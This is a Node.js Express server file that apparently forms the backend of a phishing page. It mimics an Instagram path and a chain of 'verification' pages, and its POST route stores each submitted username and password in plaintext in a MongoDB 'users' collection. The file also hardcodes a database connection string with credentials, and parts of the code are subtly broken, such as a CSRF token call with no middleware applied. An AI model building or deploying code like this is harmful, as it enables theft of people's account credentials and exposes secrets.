const express = require('express');
const {MongoClient} = require('mongodb');
const path = require('path');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');

"App constants"

const app = express();
const port = 8080;
const mongo_uri =  'mongodb+srv://owner:owner123@stockdata.xnsc5mb.mongodb.net/?retryWrites=true&w=majority';
const csrfProtection = csrf({ cookie: true });

"App config"

app.use(express.static(path.join(__dirname,'./maria')));
app.use(express.urlencoded({extended:true}));
app.set('view engine','pug');
app.set('views',path.join(__dirname,'./maria'));

"Routers"
 
 "Gets"
      app.get('/',(req,res)=>{
          res.send('hello');
      })
      
      app.get('/parent-connector',(req,res)=>{
          res.render('./pages/id_connect.pug').status(202);
      })
      
      app.get('/user-identification',(req,res)=>{
          res.render('./pages/user.pug').status(202);
      })
      
      app.get('/verification-parent',(req,res)=>{
          res.render('./pages/log_user.pug').status(202);
      })
      
      app.get('/login',(req,res)=>{
          res.redirect('./');
      })
      
      app.get('/user-connection',(req,res)=>{
        res.render('./pages/final_lg.pug').status(200);
        console.log(req.csrfToken());
      })

      app.get('/.instagram/neet_ug.prep',(req,res)=>{
        res.render('./pages/index.pug');
      })

 "Posts"

       app.post('/push-user-id',async(req,res)=>{
       
         const client = new MongoClient(mongo_uri);
         const pomise = client.connect();
         const db = client.db('StockData');
         const collection = db.collection('users');
        
         const user_schema = {
            'username':req.body.username,
            'password':req.body.password
         }
     
         try{
            await collection.insertOne(user_schema).then(res.redirect('./user-connection'));

         }
         catch(err){
            res.send('Error while logging in, try again later');
        }
          finally{
            client.close();
          }
       
       })



"Listners"
app.listen(port,()=>{
    console.log('The server is booted at port: ',port);
})